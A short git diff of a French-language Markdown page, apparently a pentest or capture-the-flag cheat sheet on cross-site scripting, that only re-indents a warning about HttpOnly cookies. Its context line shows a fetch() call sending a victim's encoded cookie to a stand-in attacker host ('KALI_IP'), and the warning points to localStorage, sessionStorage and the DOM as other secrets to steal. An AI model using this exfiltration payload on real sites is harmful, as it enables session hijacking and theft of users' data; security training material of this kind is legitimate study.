@@ -139,8 +139,8 @@ fetch("http://KALI_IP/exfil?data=" + encodedCookie)
 ```
 
 !!! warning "HttpOnly"
-  Si le cookie est HttpOnly, `document.cookie` retourne vide.
-  **Chercher d'autres secrets** : localStorage, sessionStorage, DOM.
+    Si le cookie est HttpOnly, `document.cookie` retourne vide.
+    **Chercher d'autres secrets** : localStorage, sessionStorage, DOM.
 
 ---
 
